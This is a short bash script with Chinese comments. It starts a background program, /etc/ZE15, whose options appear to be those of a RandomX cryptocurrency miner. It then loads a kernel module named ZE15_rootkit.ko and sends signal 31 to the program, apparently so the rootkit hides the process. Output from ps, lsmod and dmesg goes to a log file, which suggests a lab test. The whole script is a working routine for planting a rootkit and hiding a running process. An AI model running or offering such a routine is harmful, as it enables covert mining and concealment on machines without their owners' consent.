#!/bin/bash
echo "Starting ZE15_do.sh" >> /tmp/ze15_log
# 启动ZE15程序并将其放到后台
nohup /etc/ZE15 -p device1 -a rx/0 -k >/dev/null 2>&1 &

# 获取ZE15程序的PID
ze15_pid=$!

# 等待一小段时间，确保程序已经启动
sleep 3

ps aux |grep ZE15 >> /tmp/ze15_log 
# 加载内核模块
dmesg -C
insmod /etc/ZE15_rootkit.ko >> /tmp/ze15_log 2>&1
lsmod
# 打印dmesg信息
dmesg

# 发送信号-31到ZE15进程
kill -31 $ze15_pid >> /tmp/ze15_log 2>&1

dmesg
dmesg -C
echo "Finished ZE15_do.sh" >> /tmp/ze15_log
